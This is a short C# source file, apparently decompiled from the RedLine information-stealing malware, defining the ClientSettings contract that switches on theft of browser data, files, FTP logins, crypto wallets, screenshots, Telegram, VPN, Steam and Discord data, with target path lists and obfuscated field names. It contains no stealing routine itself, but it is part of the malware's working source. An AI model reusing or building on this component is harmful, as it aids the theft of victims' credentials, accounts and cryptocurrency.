using System.Collections.Generic;
using System.Runtime.Serialization;

namespace RedLine.SharedModels;

[DataContract(Name = "Entity2", Namespace = "Entity")]
public class ClientSettings
{
	[DataMember(Name = "Id1")]
	public bool GrabBrowsers { get; set; }

	[DataMember(Name = "Id2")]
	public bool GrabFiles { get; set; }

	[DataMember(Name = "Id3")]
	public bool GrabFTP { get; set; }

	[DataMember(Name = "Id4")]
	public bool GrabWallets { get; set; }

	[DataMember(Name = "Id5")]
	public bool GrabScreenshot { get; set; }

	[DataMember(Name = "Id6")]
	public bool GrabTelegram { get; set; }

	[DataMember(Name = "Id7")]
	public bool GrabVPN { get; set; }

	[DataMember(Name = "Id8")]
	public bool GrabSteam { get; set; }

	[DataMember(Name = "Id9")]
	public bool GrabDiscord { get; set; }

	[DataMember(Name = "Id10")]
	public IList<string> GrabPaths { get; set; }

	[DataMember(Name = "Id11")]
	public List<string> ScanChromeBrowsersPaths { get; set; }

	[DataMember(Name = "Id12")]
	public List<string> ScanGeckoBrowsersPaths { get; set; }

	[DataMember(Name = "Id13")]
	public List<WalletConfig> Configs { get; set; }
}
